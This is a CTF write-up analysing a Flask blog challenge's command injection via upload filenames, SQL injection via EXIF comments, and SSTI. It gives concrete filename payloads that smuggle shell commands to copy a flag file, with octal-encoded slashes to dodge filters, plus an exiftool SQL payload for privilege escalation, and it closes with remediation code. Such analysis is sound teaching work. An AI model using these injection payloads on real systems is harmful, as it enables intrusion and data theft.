# Blogpost CTF Challenge - Vulnerability Analysis

## Challenge Overview

This is a Flask-based blog application where users can create posts with images. The flag is stored in `/app/flag.txt` and is only accessible to users with the "admin" role (shown on the profile page).

## Identified Vulnerabilities

### üî¥ **CRITICAL: Command Injection via Image Filename**

**Location:** `app.py` lines 126-135

**Vulnerable Code:**

```python
if file and allowed_file(file.filename):
    original_filename = file.filename  # User-controlled input
    save_path = os.path.join(app.config['UPLOAD_FOLDER'], original_filename)
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    file.save(save_path)

    try:
        cmd = f"exiftool {save_path}"  # ‚ö†Ô∏è COMMAND INJECTION HERE
        meta_file = save_path + ".meta"
        full_cmd = f"{cmd} > {meta_file} 2>&1"
        os_status = os.system(full_cmd)  # Executes shell command
```

**Analysis:**

1. The `file.filename` is controlled by the attacker via the HTTP request
2. While `secure_filename()` is NOT used, `original_filename` is directly used in `os.path.join()`
3. The filename is then passed directly to `exiftool` command without sanitization
4. `os.system()` executes the full command in a shell, allowing command injection

**Exploitation:**

- Upload an image with a filename containing shell metacharacters
- Example payload: `x.png; cat /app/flag.txt > /app/uploads/target.png #.png`
- The semicolon breaks out of the exiftool command and executes arbitrary commands
- The `#` comments out the rest to avoid syntax errors

### üü† **HIGH: SQL Injection via Metadata Field**

**Location:** `app.py` lines 193-194

**Vulnerable Code:**

```python
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)
```

**Analysis:**

1. The `metadata_text` comes from exiftool output (which reads the uploaded file)
2. This is directly concatenated into an SQL query without parameterization
3. `db.executescript()` allows execution of multiple SQL statements

**Exploitation:**

- Craft an image with EXIF data containing SQL injection payload
- Use exiftool to inject malicious SQL into EXIF Comment field
- Example: `exiftool -Comment="'; UPDATE users SET role = 'admin' WHERE username = 'attacker'; --" exploit.png`
- When uploaded, the SQL executes and escalates your privileges to admin
- Then visit `/profile` to see the flag directly
- **This is a viable alternative exploitation path!** See [PRIVILEGE_ESCALATION.md](PRIVILEGE_ESCALATION.md)

### üü° **MEDIUM: Server-Side Template Injection (SSTI)**

**Location:** `app.py` lines 245-257

**Vulnerable Code:**

```python
with open(os.path.join(APP_DIR, "templates", "profile.html"), "r", encoding="utf-8") as fh:
    profile_template = fh.read()

username = user["username"] if user else ""
profile_source = profile_template.replace("{{ user.username }}", username)  # ‚ö†Ô∏è Direct replacement
# ...
return render_template_string(profile_source, user=user, flag=flag_content)  # ‚ö†Ô∏è SSTI here
```

**Analysis:**

1. The username is directly replaced into the template string
2. Then `render_template_string()` is called on the modified template
3. If username contains Jinja2 template syntax, it could be executed

**Exploitation:**

- Register with username containing Jinja2 template injection: `{{ 7*7 }}`
- However, the username is used in SQL queries with parameterization (safe)
- The replaced username would need to contain valid Jinja2 syntax to escalate privileges or read files
- Limited impact since we'd need to be admin to see the flag anyway

### üîµ **INFO: Path Traversal Protection**

**Location:** `app.py` lines 208-219

**Code:**

```python
@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    if "user_id" not in session:
        return redirect(url_for("login"))
    if ".." in filename or filename.startswith("/"):  # Basic protection
        abort(404)
    db = get_db()
    cur = db.execute("SELECT id FROM posts WHERE image_filename = ? AND author_id = ?",
                     (filename, session["user_id"]))
    row = cur.fetchone()
    if not row:
        abort(404)
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
```

**Analysis:**

- There's basic protection against path traversal (`..` and `/` prefix)
- Additional authorization check ensures users can only access their own images
- This makes it harder to read arbitrary files directly through this endpoint

## Exploitation Strategies

There are **TWO** viable paths to get the flag:

### Path 1: Command Injection (Primary/Easier)

The `dapur.py` script demonstrates the working exploit chain:

### Path 2: SQL Injection for Privilege Escalation (Alternative)

You can also exploit the SQL injection vulnerability to become admin and view the flag directly on `/profile`. See **[PRIVILEGE_ESCALATION.md](PRIVILEGE_ESCALATION.md)** for details.

## Path 1: Command Injection Exploitation

The `dapur.py` script demonstrates this approach:

### Step-by-Step Exploitation:

1. **Register and Login**
   - Create a normal user account
2. **Create Initial Post**

   - Upload a legitimate image (e.g., small PNG)
   - The app will hash the image and rename it to `<sha256>.png`
   - This gives us a known target filename in `/app/uploads/`

3. **Find the Target Filename**

   - Search for our post to get the hashed filename
   - Example: `a1b2c3d4....<hash>.png`

4. **Execute Command Injection**

   - Upload another "image" with malicious filename:
     ```
     x.png; cp $(printf '\057app\057flag.txt') $(printf '\057app\057uploads\057<target_hash>.png') #.png
     ```
   - The `\057` is octal encoding for `/` to bypass potential filters
   - This overwrites our first image with the flag content

5. **Retrieve the Flag**
   - Fetch `/uploads/<target_hash>.png`
   - Since we own this post, authorization check passes
   - The image now contains the flag text

### Why This Works:

1. **Bypasses filename validation**: The `allowed_file()` function only checks extension, not content
2. **Bypasses authorization**: We're accessing our own uploaded file
3. **Exploits command injection**: Shell metacharacters in filename execute commands
4. **Uses octal encoding**: Bypasses potential basic blacklist filters for `/`
5. **Race condition handling**: The exploit script retries multiple times to catch the window where flag is present

## Proof of Concept

The working exploit is in `dapur.py`:

```bash
python3 dapur.py <target-ip> <target-port>
```

Example payloads used:

- **CP payload**: `x.png; cp $(printf '\057app\057flag.txt') $(printf '\057app\057uploads\057<target>.png') #.png`
- **CAT payload**: `x.png; cat $(printf '\057app\057flag.txt') > $(printf '\057app\057uploads\057<target>.png') #.png`

## Remediation Recommendations

1. **Fix Command Injection:**

   ```python
   # Use subprocess with array (no shell)
   import subprocess
   result = subprocess.run(['exiftool', save_path], capture_output=True, text=True)
   metadata_text = result.stdout
   ```

2. **Fix SQL Injection:**

   ```python
   # Use parameterized queries
   db.execute("UPDATE posts SET metadata = ? WHERE id = ?", (metadata_text, post_id))
   ```

3. **Fix SSTI:**

   ```python
   # Don't use render_template_string with user input
   # Or properly escape the username:
   from markupsafe import escape
   username = escape(user["username"]) if user else ""
   ```

4. **Use secure_filename():**

   ```python
   from werkzeug.utils import secure_filename
   safe_filename = secure_filename(file.filename)
   ```

5. **Additional Security:**
   - Implement proper file type validation (magic bytes)
   - Use Content Security Policy headers
   - Implement rate limiting
   - Add input validation and sanitization
   - Run the application with minimal privileges

## Flag Format

```
GEMASTIK{<64-char-hex-sha256>}
```

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- OWASP SQL Injection: https://owasp.org/www-project-top-ten/2017/A1_2017-Injection
- Flask Security Best Practices: https://flask.palletsprojects.com/en/2.3.x/security/
